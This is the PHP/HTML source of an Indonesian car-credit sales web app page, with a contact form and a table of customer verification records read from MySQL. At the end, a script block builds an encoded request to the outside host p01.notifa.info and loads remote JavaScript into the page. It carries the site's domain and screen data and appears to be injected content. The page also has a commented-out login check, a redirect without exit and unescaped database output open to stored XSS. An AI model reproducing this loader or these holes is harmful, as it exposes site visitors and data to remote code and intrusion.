<?php
session_start();
error_reporting(0);
include '../core/core.php';

//if(!isset($_SESSION['username'])) {
 // header("Location: ../user/login.php?access_denied");
//}
?>

<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kredit Mobil - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
  <!-- /This styles needs for demo -->

  <link rel="stylesheet" href="../admin/css/bootstrap.min.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','../../../../www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96534204-1', 'auto');
  ga('send', 'pageview');

  </script>

  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/modernizr.custom.js"></script>
</head>

<body>
  <!-- Loading animation -->
  <div class="preloader">
    <div class="preloader-animation">
      <div class="dot1"></div>
      <div class="dot2"></div>
    </div>
  </div>
  <!-- /Loading animation -->

  <div id="page" class="page">
    <!-- Header -->
    <header id="site_header" class="header mobile-menu-hide header-color-light" style=>
      <div class="my-photo tilt-effect">
        <img src="../images/photo.png" alt="image">
      </div>

      <div class="site-title-block">
        <h1 class="site-title">Aplikasi Mobil  </h1>
      </div>

      <!-- Navigation -->
      <div class="site-nav">
        <!-- Main menu -->
        <ul id="nav" class="site-main-menu">
          <li>
            <a class="pt-trigger" href="#home" data-animation="21"><i class="menu-icon pe-7s-icon pe-7s-home"></i>  Home</a>
          </li>
 
        <li>
          <a class="pt-trigger" href="#portfolio" data-animation="19"><i class="menu-icon pe-7s-icon pe-7s-car"></i>Mobil</a>
        </li>
 
      </ul>
      <!-- /Main menu -->
    </div>
    <!-- Navigation -->
  </header>
  <!-- /Header -->

  <!-- Mobile Header -->
  <div class="mobile-header mobile-visible">
    <div class="mobile-logo-container">
      <div class="mobile-site-title">Aplikasi Penjualan Mobil</div>
    </div>

    <a class="menu-toggle mobile-visible">
      <i class="fa fa-bars"></i>
    </a>
  </div>
  <!-- /Mobile Header -->

  <!-- Main Content -->
  <div id="main" class="site-main">
    <!-- Page changer wrapper -->
    <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
      <!-- Subpages -->
      <div class="subpages">

        <!-- Home Subpage -->
        <section class="pt-page pt-page-1 section-without-bg section-paddings-0 table" data-id="home">
          <div class="section-inner">
            <div class="home-page-block">
              <h2>Kredit Mobil</h2>
              <div class="owl-carousel text-rotation">
                <div class="item">
                  <p class="home-page-description">Ya disini...</p>
                </div>
                <div class="item">
                  <p class="home-page-description">Mudah dan Cepat</p>
                </div>
              </div>
            </div>
          </div>
        </section>
        <!-- End of Home Subpage -->

        <!-- Portfolio Subpage -->
        <section class="pt-page pt-page-4" data-id="portfolio">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper">
                <h2 class="section-title">Mobil</h2>
                <h5 class="section-description">Temukan pilihanmu...</h5>
              </div>
            </div>

            <!-- Portfolio Content -->
            <div class="portfolio-content">

              <!-- Portfolio filter -->
              <ul id="portfolio_filters" class="portfolio-filters">
                <li class="active">
                  <a class="filter btn btn-sm btn-link active" data-group="all">All</a>
                </li>
                <li>
                  <a class="filter btn btn-sm btn-link" data-group="media">2015</a>
                </li>
                <li>
                  <a class="filter btn btn-sm btn-link" data-group="illustration">2016</a>
                </li>
                <li>
                  <a class="filter btn btn-sm btn-link" data-group="video">2017</a>
                </li>
              </ul>
              <!-- End of Portfolio filter -->

              <!-- Portfolio Grid -->
              <div id="portfolio_grid" class="portfolio-grid portfolio-masonry masonry-grid-3">

                <!-- Portfolio Item 1 -->
                <figure class="item" data-groups='["all", "media"]'>
                  <a class="ajax-page-load-link" href="portfolio-1.php">
                    <img src="../images/portfolio/1.jpg" alt="">
                    <div>
                      <h5 class="name">Crv</h5>
                      <!-- <small>Media</small> -->
                      <i class="pe-7s-icon pe-7s-display2"></i>
                    </div>
                  </a>
                </figure>
                <!-- /Portfolio Item 1 -->


                <!-- Portfolio Item 4 -->
                <figure class="item" data-groups='["all", "illustration"]'>
                  <a class="ajax-page-load-link" href="portfolio-2.php">
                    <img src="../images/portfolio/2.jpg" alt="">
                    <div>
                      <h5 class="name">Accord</h5>
                      <!-- <small>Media</small> -->
                      <i class="pe-7s-icon pe-7s-display2"></i>
                    </div>
                  </a>
                </figure>
                <!-- /Portfolio Item 4 -->

                <!-- Portfolio Item 6 -->
                <figure class="item" data-groups='["all", "video"]'>
                  <a class="ajax-page-load-link" href="portfolio-3.php">
                    <img src="../images/portfolio/3.jpg" alt="">
                    <div>
                      <h5 class="name">Alya</h5>
                      <!-- <small>Media</small> -->
                      <i class="pe-7s-icon pe-7s-display2"></i>
                    </div>
                  </a>
                </figure>
                <!-- /Portfolio Item 6 -->
              </div>
              <!-- /Portfolio Grid -->

              </div>
              <!-- /Portfolio Content -->
              </div>
              </section>
              <!-- /Portfolio Subpage -->

        <!-- Contact Subpage -->
        <section class="pt-page pt-page-5" data-id="contact">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper">
                <h2 class="section-title">Contact</h2>
                <h5 class="section-description">Bantuan?</h5>
              </div>
            </div>

            <div class="row">
              <div class="col-sm-6 col-md-6 subpage-block">
                <div class="block-title">
                  <h3>Temukan kami...</h3>
                </div>
                <p>Sed eleifend sed nibh nec fringilla. Donec eu cursus sem, vitae tristique ante. Cras pretium rutrum egestas. Integer ultrices libero sed justo vehicula, eget tincidunt tortor tempus.</p>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-map-marker"></i>
                  </div>
                  <div class="ci-text">
                    <h5>Indonesia, Jawa Barat</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-mail"></i>
                  </div>
                  <div class="ci-text">
                    <h5>kreditMobil@example.com</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-call"></i>
                  </div>
                  <div class="ci-text">
                    <h5>+123 654 78900</h5>
                  </div>
                </div>
                <div class="contact-info-block">
                  <div class="ci-icon">
                    <i class="pe-7s-icon pe-7s-check"></i>
                  </div>
                  <div class="ci-text">
                    <h5>Active</h5>
                  </div>
                </div>
              </div>

              <div class="col-sm-6 col-md-6 subpage-block">
                <div class="block-title">
                  <h3>Contact Form</h3>
                </div>
                <form action="insert-psn.php" method="post" >

                  <div class="controls">
                    <div class="form-group">
                      <input id="form_name" type="text" name="nm" class="form-control" placeholder="Full Name" required="required" data-error="Name is required.">
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-user"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <div class="form-group">
                      <input id="form_email" type="email" name="eml" class="form-control" placeholder="Email Address" required="required" data-error="Valid email is required.">
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-mail"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <div class="form-group">
                      <textarea id="form_message" name="msg" class="form-control" placeholder="Message for Me" rows="4" required="required" data-error="Please, leave me a message."></textarea>
                      <div class="form-control-border"></div>
                      <i class="form-control-icon pe-7s-comment"></i>
                      <div class="help-block with-errors"></div>
                    </div>

                    <input type="submit" name="tbh_psn" class="button btn-send" value="Send message">


                  </div>
                </form>
              </div>
            </div>
          </div>
        </section>
        <!-- End Contact Subpage -->


            <!-- About Me Subpage -->
            <section class="pt-page pt-page-1" data-id="info">
              <div class="border-block-top-110"></div>
              <div class="section-inner">
                <div class="section-title-block">
                  <div class="section-title-wrapper clearfix">
                    <h2 class="section-title">Informasi</h2>
                    <h5 class="section-description">Informasi Barang</h5>
                  </div>
                </div>

                <script type="text/javascript">
                $(document).ready(function() {
                  $('#datatable2').DataTable();

                  //Buttons examples
                  var table = $('#datatable2-buttons').DataTable({
                    lengthChange: false,
                    searching: true,
                    buttons: ['copy', 'excel', 'pdf']
                  });

                  table.buttons().container()
                  .appendTo('#datatable2-buttons_wrapper .col-md-6:eq(0)');
                });
                </script>

                <div class="row">

                  <div class="col-12">
                    <div class="card-box table-responsive">
                      <table id="datatable2-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
                        <?php if(isset($_GET['status'])): ?>
                          <p>
                            <?php
                            if($_GET['status'] == 'sukses'){
                              echo "Tambah data baru berhasil!";
                            } else {
                              echo "Tambah data gagal!";
                            }
                            ?>
                          </p>
                        <?php endif; ?>
<?php						
if(!isset($_SESSION['username'])) {
  header("Location: ../user/login.php?access_denied");
 }
 ?>
						
						
                        <thead>

                          <tr>
                            <th>No</th>
                            <th>Nama</th>
                            <th>Nama Produk2</th>
                            <th>Metode</th>
                            <th>Jenis</th>
                            <th>Waktu</th>
                            <th>Status</th>
                          </tr>
                        </thead>

                        <tbody>
                          <?php
                          $no=0;
                          $sql = "SELECT * FROM verifikasi";
                          $query = mysqli_query($connect, $sql);

                          while($data = mysqli_fetch_array($query)){
                            $no++;
                            $status = $data['status'];
                            ?>
                            <tr>
                              <td><?= $no ?></td>
                              <td><?= $data['nama'] ?></td>
                              <td><?= $data['nama_produk'] ?></td>
                              <td><?= $data['metode'] ?></td>
                              <td><?= $data['waktu'] ?></td>
                              <td><?= $data['jenis'] ?></td>
                              <td><?= $data['status'] ?></td>
                            </tr>
                          <?php } ?>
                        </tbody>

                      </td>
                    </tr>
                  </tfoot>
                </table>

              </div>
            </div>
            <!-- </div> -->
            <!-- end row -->
          </section>
          <!-- End of About Me Subpage -->

        <!-- About Me Subpage -->
        <section class="pt-page pt-page-2" data-id="about_me2">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper clearfix">
                <h2 class="section-title">Tentang Kami</h2>
                <h5 class="section-description">Kredit Mobil - Mudah dan Cepat</h5>
              </div>
            </div>

            <div class="row">
              <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">
                <div class="my-photo-block tilt-effect">
                  <img src="../images/photo.png" alt="">
                </div>
              </div>

              <div class="col-sm-6 col-md-6 col-lg-4">
                <h3>Kredit Mobil</h3>
                <p>Praesent ut tortor consectetur, semper sapien non, lacinia augue. Aenean arcu libero, facilisis et nisi non, tempus faucibus tortor. Mauris vel nulla aliquam, pellentesque enim ac, faucibus tortor. Nulla odio nibh, cursus sit amet urna id, dignissim euismod augue.</p>
                <p>Duis sollicitudin, libero porttitor rutrum ultrices, turpis lorem fermentum justo, quis ornare augue tortor non est. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.</p>
              </div>

              <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">
                <ul class="info-list">
                  <li><span class="title">Alamat</span><span class="value">Indonesia Jawa Barat, Cirebon</span></li>
                  <li><span class="title">E-mail</span><span class="value"><a href="mailto:email@example.com">kreditMobil@example.com</a></span></li>
                  <li><span class="title">Telepon</span><span class="value">+0123 123 456 789</span></li>
                  <li><span class="title">Status</span><span class="value available">Active</span></li>
                </ul>

                <ul class="social-links">
                  <li><a class="tip social-button" href="#" title="Twitter"><i class="fa fa-twitter"></i></a></li>
                  <!-- Full list of social icons: http://fontawesome.io/icons/#brand -->
                  <li><a class="tip social-button" href="#" title="Facebook"><i class="fa fa-facebook"></i></a></li>
                  <li><a class="tip social-button" href="#" title="Google Plus"><i class="fa fa-google-plus"></i></a></li>
                </ul>
              </div>
            </div>

            <!-- Services block -->
            <div class="block-title">
              <h3>Layanan</h3>
            </div>

            <div class="row">
              <div class="col-sm-3 col-md-3 subpage-block">
                <div class="service-block">
                  <div class="service-info">
                    <img src="../images/service/web_design_icon.png" alt="Responsive Design">
                    <h4>Website</h4>
                    <p>Konsumen datang ke website kami.</p>
                  </div>
                </div>
              </div>

              <div class="col-sm-3 col-md-2 subpage-block">
                <div class="service-block">
                  <div class="service-info">
                    <img src="../images/service/photography_icon.png" alt="Photography">
                    <h4>Mobil</h4>
                    <p>Konsumen memilih Mobil yang akan dibeli.</p>
                  </div>
                </div>
              </div>

              <div class="col-sm-3 col-md-2 subpage-block">
                <div class="service-block">
                  <div class="service-info">
                    <img src="../images/service/creativity_icon.png" alt="Creativity">
                    <h4>Transaksi</h4>
                    <p>Terjadilah transaksi jual beli.</p>
                  </div>
                </div>
              </div>

              <div class="col-sm-3 col-md-2 subpage-block">
                <div class="service-block">
                  <div class="service-info">
                    <img src="../images/service/advetising_icon.png" alt="Advetising">
                    <h4>Konsumen</h4>
                    <p>Konsumen membayar sejumlah harga Mobil.</p>
                  </div>
                </div>
              </div>

              <div class="col-sm-3 col-md-3 subpage-block">
                <div class="service-block">
                  <div class="service-info">
                    <img src="../images/service/packaging_icon.png" alt="Advetising">
                    <h4>Dealer</h4>
                    <p>Dealer mengirim Mobil yang dibeli oleh konsumen.</p>
                  </div>
                </div>
              </div>
            </div>
            <!-- End of Services block -->
          </div>
        </section>
        <!-- End of About Me Subpage -->

      </div>
    </div>
    <!-- /Page changer wrapper -->
  </div>
  <!-- /Main Content -->
</div>

<!-- Demo Color changer -->
<a id="lm_demo_panel_switcher" class="lm-demo-panel-switcher right"><i class="fa fa-gear"></i></a>
<div id="lm_demo_panel" class="lm-demo-panel right panel-color-red active">
  <div class="demo-panel-title">Selamat datang!</div>
  <div class="demo-panel-title">
    <?php echo $_SESSION['username']; ?></div>
    <div id="header_position" class="demo-panel-options mobile-hidden">

      <a href="../user/logout.php" class="layout-switcher" data-id="layout-menu-bottom"><div class="preview layout bottom">Keluar</div></a>
    </div>

  </div>

    <!-- Required datatable js -->
    <script src="../plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="../plugins/datatables/dataTables.bootstrap4.min.js"></script>
    <!-- Buttons examples -->
    <script src="../plugins/datatables/dataTables.buttons.min.js"></script>
    <script src="../plugins/datatables/buttons.bootstrap4.min.js"></script>
    <script src="../plugins/datatables/jszip.min.js"></script>
    <script src="../plugins/datatables/pdfmake.min.js"></script>
    <script src="../plugins/datatables/vfs_fonts.js"></script>
    <script src="../plugins/datatables/buttons.html5.min.js"></script>
    <script src="../plugins/datatables/buttons.print.min.js"></script>
    <script src="../plugins/datatables/buttons.colVis.min.js"></script>
    <!-- Responsive examples -->
    <script src="../plugins/datatables/dataTables.responsive.min.js"></script>
    <script src="../plugins/datatables/responsive.bootstrap4.min.js"></script>


    <!-- /Demo Color changer -->
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/pages-switcher.js"></script>
    <script src="../js/imagesloaded.pkgd.min.js"></script>
    <script src="../js/validator.js"></script>
    <script src="../js/jquery.shuffle.min.js"></script>
    <script src="../js/masonry.pkgd.min.js"></script>
    <script src="../js/owl.carousel.min.js"></script>
    <script src="../js/jquery.magnific-popup.min.js"></script>
    <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script src="../js/tilt.jquery.min.js"></script>
    <script src="../js/jquery.hoverdir.js"></script>
    <script src="../js/main.js"></script>

    <!-- Demo Color changer Script -->
    <script src="../preview/lmpixels-demo-panel.js"></script>
    <!-- /Demo Color changer Script -->
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVa2K%2bNZnlpTXt9YnUCwpMMLx%2b%2bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq%2bGxts8680ZPIfGcjWoyu1MUIXmG%2b%2fgsc13iDQgNwbvkNzcl%2bgd5G365lc%2fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ%2b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH%2bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe%2beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt%2fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT%2bA3GpgWz0UZBVqoJQUQTafmPPjQfmo%2bujydoTzM%2b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY%2ftUBTyzxtnHSs6iYj1qOwVzMd4cpc%2fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG%2bXplJfh1lkgP45Ezt%2b7MOHgoActEOLtw + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
  </body>
  </html>
